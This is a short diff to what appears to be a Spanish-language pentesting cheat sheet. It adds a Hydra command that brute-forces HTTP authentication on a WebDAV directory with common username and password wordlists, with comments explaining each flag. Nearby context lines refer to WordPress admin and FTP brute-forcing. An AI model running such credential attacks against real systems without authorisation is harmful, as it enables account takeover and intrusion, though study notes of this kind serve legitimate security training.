@@ -30,6 +30,15 @@ Esto se usa en el panel del admin de WordPress.
 	# F = Error que nos muestre el panel de autenticacion, por si no sirve con el 'S'
 ```
 
+## Hydra fuerza bruta WebDAV
+
+```python 
+❯ hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt ❮IP❯ http-get /webdav/
+
+	# webdav = Directorio de autenticacion 
+	# L = Indicas un archivo que disponga de usuarios 
+	# P = Ruta del diccionario o 'archivo que contiene passwds'
+```
 
 ## Hydra fuerza bruta FTP
 ```python
